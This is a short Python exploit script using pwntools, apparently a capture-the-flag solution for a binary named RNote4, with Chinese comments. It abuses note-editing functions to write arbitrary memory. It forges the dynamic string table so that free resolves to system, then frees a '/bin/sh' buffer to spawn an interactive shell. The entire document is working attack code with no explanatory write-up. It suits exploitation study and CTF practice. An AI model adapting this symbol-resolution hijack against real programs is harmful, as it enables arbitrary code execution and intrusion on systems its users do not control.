from pwn import*
p = process('./RNote4')

def create(n, str):
    p.send('\x01')
    p.send(chr(n))
    p.send(str)
def edit(index, n, str):
    p.send('\x02')
    p.send(chr(index))
    p.send(chr(n))
    p.send(str)
def free(index):
    p.send('\x03')
    p.send(chr(index))

# 先创建两个note用于写任意地址
# 第一个用来设置要写的地址
# 第二个用来设置要写的内容
create(0x8, '/bin/sh\x00')
create(0x8, '/bin/sh\x00')

# 将bss段的一部分用于写我们的STRTAB
payload = b'/bin/sh\x00' + b'A' * 0x10 + p64(0x21) + p64(0x8) + p64(0x6020C0 + 0x10)
edit(0, len(payload), payload)
payload = b'a' * (0x400457 - 0x4003F8) + b'system\x00'
edit(1, len(payload), payload)

# 设置STRTAB指向我们的STRTAB
payload = b'/bin/sh\x00' + b'A' * 0x10 + p64(0x21) + p64(0x8) + p64(0x601EA8 + 0x8)
edit(0, len(payload), payload)
payload = p64(0x6020C0 + 0x10)
edit(1, len(payload), payload)

# 触发_dl_runtime_resolve
free(0)

p.interactive()